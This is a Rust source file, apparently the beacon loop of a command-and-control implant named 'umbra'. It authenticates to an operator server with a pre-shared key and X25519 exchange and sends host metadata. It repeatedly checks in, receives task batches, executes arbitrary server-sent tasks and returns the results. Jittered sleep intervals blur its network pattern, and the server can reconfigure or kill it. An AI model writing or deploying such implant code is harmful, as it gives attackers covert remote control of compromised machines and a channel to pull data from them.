//! Beacon loop: handshake, check-in, task execution, jittered sleep.

use crate::config::{Config, Transport};
use crate::crypto;
use crate::session::Session;
use crate::sysinfo;
use crate::task;
use crate::transport::{Channel, HttpChannel, TcpChannel};
use crate::upk::{self, Value};
use crate::wire;

pub const VERSION: &str = env!("CARGO_PKG_VERSION");
pub const MAX_TASKS_PER_CYCLE: usize = 64;
/// Control frames (REKEY) tolerated before a TASK_BATCH.
const MAX_REKEY_ROUNDS: usize = 4;

pub struct Beacon {
    pub cfg: Config,
    session: Option<Session>,
    channel: Option<Box<dyn Channel>>,
    cycles: u64,
    failures: u32,
}

impl Beacon {
    pub fn new(cfg: Config) -> Self {
        Beacon { cfg, session: None, channel: None, cycles: 0, failures: 0 }
    }

    fn log(&self, msg: &str) {
        if self.cfg.verbose {
            eprintln!("[umbra] {msg}");
        }
    }

    /// Run until `max_cycles` is reached (None = forever).
    pub fn run(&mut self, max_cycles: Option<u64>) -> Result<(), String> {
        loop {
            if let Some(limit) = max_cycles {
                if self.cycles >= limit {
                    return Ok(());
                }
            }
            match self.run_once() {
                Ok(true) => {
                    self.failures = 0;
                    self.cycles += 1;
                }
                Ok(false) => return Ok(()),
                Err(e) => {
                    self.failures = self.failures.saturating_add(1);
                    self.log(&format!("cycle failed ({e}), backing off"));
                    let backoff = self.backoff_secs();
                    sleep_secs(backoff);
                    continue;
                }
            }
            if let Some(limit) = max_cycles {
                if self.cycles >= limit {
                    return Ok(());
                }
            }
            sleep_secs(self.next_interval());
        }
    }

    fn backoff_secs(&self) -> u64 {
        let base = self.cfg.sleep.max(1);
        let factor = 1u64 << self.failures.min(5);
        (base * factor).min(300)
    }

    /// Sleep interval with jitter: uniform in [sleep*(1-j), sleep*(1+j)].
    fn next_interval(&self) -> u64 {
        let base = self.cfg.sleep.max(1) as f64;
        let j = (self.cfg.jitter.min(90) as f64) / 100.0;
        let lo = (base * (1.0 - j)).max(1.0);
        let hi = (base * (1.0 + j)).max(lo);
        let span = hi - lo;
        let r = random_unit();
        (lo + span * r) as u64
    }

    fn open_channel(&mut self) -> Result<(), String> {
        let ch: Box<dyn Channel> = match self.cfg.transport {
            Transport::Tcp => {
                let mut c = TcpChannel::new(&self.cfg.server);
                c.connect().map_err(|e| format!("connect {}: {e}", self.cfg.server))?;
                Box::new(c)
            }
            Transport::Http => Box::new(
                HttpChannel::new(&self.cfg.server, &self.cfg.http_path)
                    .map_err(|e| format!("http channel: {e}"))?,
            ),
        };
        self.channel = Some(ch);
        Ok(())
    }

    fn run_once(&mut self) -> Result<bool, String> {
        self.session = None;
        self.open_channel()?;
        self.handshake()?;
        let keep_running = self.cycle()?;
        if let Some(ch) = self.channel.as_mut() {
            let _ = ch.flush();
            ch.close();
        }
        self.channel = None;
        self.session = None;
        Ok(keep_running)
    }

    // -- handshake -------------------------------------------------------
    fn handshake(&mut self) -> Result<(), String> {
        let suites = crypto::supported_suites();
        let suite = *suites.first().ok_or("no AEAD suite compiled in")?;
        let (secret, pubkey) = crypto::x25519_keypair();
        let cn = crypto::random_bytes(16);
        let ts = now_secs();

        let auth = crypto::hello_auth(
            &self.cfg.psk,
            crypto::ROLE_AGENT,
            self.cfg.agent_id.as_bytes(),
            &pubkey,
            &cn,
            ts,
            suite,
        )
        .map_err(|e| format!("hello auth: {e}"))?;

        let hello = upk::map(vec![
            ("v", upk::u(1)),
            ("role", upk::u(crypto::ROLE_AGENT as u64)),
            ("id", upk::s(&self.cfg.agent_id)),
            ("pub", upk::bin(&pubkey)),
            ("cn", upk::bin(&cn)),
            ("ts", upk::u(ts)),
            ("suite", upk::u(suite as u64)),
            ("auth", upk::bin(&auth)),
            ("meta", sysinfo::meta(VERSION)),
        ]);
        let encoded = upk::encode(&hello).map_err(|e| format!("encode hello: {e}"))?;
        let mut body = Vec::with_capacity(encoded.len() + 1);
        body.push(wire::MARKER_HELLO);
        body.extend_from_slice(&encoded);

        let mut boot = Session::from_bootstrap(&self.cfg.psk, suite, false)
            .map_err(|e| format!("bootstrap session: {e}"))?;
        let frame = boot.seal(wire::MSG_HELLO, &body).map_err(|e| format!("seal hello: {e}"))?;
        self.write(&frame)?;

        let resp = self.read()?;
        let (msg_type, plain) =
            boot.open(&resp).map_err(|e| format!("open hello_ack: {e}"))?;
        if msg_type != wire::MSG_HELLO_ACK {
            return Err(format!("expected HELLO_ACK, got {}", wire::type_name(msg_type)));
        }
        if plain.first() != Some(&wire::MARKER_HELLO_ACK) {
            return Err("bad HELLO_ACK marker".to_string());
        }
        let ack = upk::decode_exact(&plain[1..]).map_err(|e| format!("decode hello_ack: {e}"))?;

        let server_pub = ack.bin_or("pub", &[]);
        let sn = ack.bin_or("sn", &[]);
        let sid = ack.bin_or("sid", &[]);
        let neg_suite = ack.u64_or("suite", 0) as u8;
        if server_pub.len() != 32 || sn.len() != 16 || sid.len() != 16 {
            return Err("malformed HELLO_ACK fields".to_string());
        }
        if neg_suite != suite {
            return Err("server changed the AEAD suite without negotiation".to_string());
        }

        let want = crypto::ack_auth(
            &self.cfg.psk,
            self.cfg.agent_id.as_bytes(),
            &pubkey,
            &server_pub,
            &cn,
            &sn,
            &sid,
            neg_suite,
        )
        .map_err(|e| format!("ack auth: {e}"))?;
        let got = ack.bin_or("auth", &[]);
        if !ct_eq(&want, &got) {
            return Err("server authentication failed (wrong PSK?)".to_string());
        }

        let shared = crypto::x25519_shared(&secret, &server_pub)
            .map_err(|e| format!("x25519: {e}"))?;
        let (prk, km) = crypto::derive_session(&shared, &cn, &sn)
            .map_err(|e| format!("derive session: {e}"))?;
        self.session = Some(
            Session::new(neg_suite, km, false, false, Some(prk))
                .map_err(|e| format!("session: {e}"))?,
        );

        if let Some(cfg) = ack.get("cfg") {
            let sleep = cfg.u64_or("sleep", self.cfg.sleep);
            let jitter = cfg.u64_or("jitter", self.cfg.jitter as u64) as u32;
            self.apply_policy(sleep, jitter);
        }
        if let Some(ch) = self.channel.as_mut() {
            ch.set_session_id(&crate::config::hex_encode(&sid));
        }
        self.log("handshake complete");
        Ok(())
    }

    fn apply_policy(&mut self, sleep: u64, jitter: u32) {
        if sleep > 0 {
            self.cfg.sleep = sleep;
        }
        if jitter <= 90 {
            self.cfg.jitter = jitter;
        }
    }

    // -- one beacon cycle ------------------------------------------------
    fn cycle(&mut self) -> Result<bool, String> {
        let ts = now_secs();
        let checkin = upk::map(vec![("ts", upk::u(ts)), ("n", upk::u(0))]);
        let frame = self.seal(wire::MSG_CHECKIN, &checkin)?;
        self.write(&frame)?;

        // The server may rotate keys right before the batch. A REKEY frame is
        // always sealed with the OLD key set and is always followed by
        // TASK_BATCH, so read until the batch arrives instead of guessing a
        // frame count. Bound the loop so a hostile server cannot stall us.
        let mut batch = upk::map(vec![]);
        let mut seen = 0;
        loop {
            seen += 1;
            if seen > MAX_REKEY_ROUNDS {
                return Err("too many control frames before TASK_BATCH".to_string());
            }
            let resp = self.read()?;
            let (msg_type, body) = self.open(&resp)?;
            match msg_type {
                wire::MSG_REKEY => {
                    let seed = body.bin_or("seed", &[]);
                    if seed.len() != 32 {
                        return Err("malformed REKEY seed".to_string());
                    }
                    if let Some(sess) = self.session.as_mut() {
                        sess.apply_rekey(&seed).map_err(|e| format!("rekey: {e}"))?;
                        self.log("session rekeyed");
                    }
                }
                wire::MSG_TASK_BATCH => {
                    batch = body;
                    break;
                }
                wire::MSG_KILL => {
                    self.log("server sent KILL");
                    return Ok(false);
                }
                other => {
                    return Err(format!("expected TASK_BATCH, got {}", wire::type_name(other)))
                }
            }
        }

        // Server-side beacon policy wins over the compiled-in defaults.
        self.apply_policy(batch.u64_or("sleep", self.cfg.sleep), batch.u64_or("jitter", self.cfg.jitter as u64) as u32);

        let tasks = match batch.get("tasks") {
            Some(Value::Arr(items)) => items.clone(),
            _ => Vec::new(),
        };
        for (idx, t) in tasks.iter().enumerate() {
            if idx >= MAX_TASKS_PER_CYCLE {
                break;
            }
            let id = t.str_or("id", "");
            let kind = t.str_or("kind", "");
            let args = t.get("args").cloned().unwrap_or_else(|| upk::map(vec![]));
            self.log(&format!("task {id} kind={kind}"));

            match kind.as_str() {
                "exit" | "kill" => {
                    let outcome = task::run(&kind, &args);
                    self.send_result(&id, &outcome)?;
                    self.send_bye()?;
                    return Ok(false);
                }
                "sleep" => {
                    let sleep = args.u64_or("sleep", self.cfg.sleep);
                    let jitter = args.u64_or("jitter", self.cfg.jitter as u64) as u32;
                    self.apply_policy(sleep, jitter);
                    let outcome = task::run("sleep", &args);
                    self.send_result(&id, &outcome)?;
                }
                _ => {
                    let outcome = task::run(&kind, &args);
                    self.send_result(&id, &outcome)?;
                }
            }
        }

        self.send_bye()?;
        Ok(true)
    }

    fn send_result(&mut self, task_id: &str, outcome: &task::Outcome) -> Result<(), String> {
        let value = outcome.to_value(task_id);
        let frame = self.seal(wire::MSG_RESULT, &value)?;
        self.write(&frame)
    }

    fn send_bye(&mut self) -> Result<(), String> {
        let frame = self.seal(wire::MSG_BYE, &upk::map(vec![]))?;
        self.write(&frame)?;
        if let Some(ch) = self.channel.as_mut() {
            let _ = ch.flush();
        }
        Ok(())
    }

    // -- plumbing --------------------------------------------------------
    fn seal(&mut self, msg_type: u8, value: &Value) -> Result<Vec<u8>, String> {
        let sess = self.session.as_mut().ok_or("no session")?;
        sess.seal_value(msg_type, value).map_err(|e| format!("seal: {e}"))
    }

    fn open(&mut self, frame: &[u8]) -> Result<(u8, Value), String> {
        let sess = self.session.as_mut().ok_or("no session")?;
        sess.open_value(frame).map_err(|e| format!("open: {e}"))
    }

    fn write(&mut self, frame: &[u8]) -> Result<(), String> {
        let ch = self.channel.as_mut().ok_or("no channel")?;
        ch.write_frame(frame).map_err(|e| format!("write: {e}"))
    }

    fn read(&mut self) -> Result<Vec<u8>, String> {
        let ch = self.channel.as_mut().ok_or("no channel")?;
        ch.read_frame().map_err(|e| format!("read: {e}"))
    }
}

fn now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn random_unit() -> f64 {
    let b = crypto::random_bytes(8);
    let mut v = [0u8; 8];
    v.copy_from_slice(&b);
    let n = u64::from_le_bytes(v) >> 11;
    (n as f64) / ((1u64 << 53) as f64)
}

fn sleep_secs(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs.max(1)));
}

/// Constant-time comparison for authentication tags.
pub fn ct_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut diff = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        diff |= x ^ y;
    }
    diff == 0
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ct_eq_behaves() {
        assert!(ct_eq(b"abc", b"abc"));
        assert!(!ct_eq(b"abc", b"abd"));
        assert!(!ct_eq(b"abc", b"ab"));
    }

    #[test]
    fn jitter_stays_in_window() {
        let mut cfg = Config {
            server: "127.0.0.1:1".into(),
            transport: Transport::Tcp,
            http_path: "/api/v1/beacon".into(),
            agent_id: "test".into(),
            psk: vec![1u8; 32],
            sleep: 100,
            jitter: 20,
            verbose: false,
        };
        cfg.sleep = 100;
        let b = Beacon::new(cfg);
        for _ in 0..200 {
            let v = b.next_interval();
            assert!((80..=120).contains(&v), "interval {v} outside jitter window");
        }
    }
}
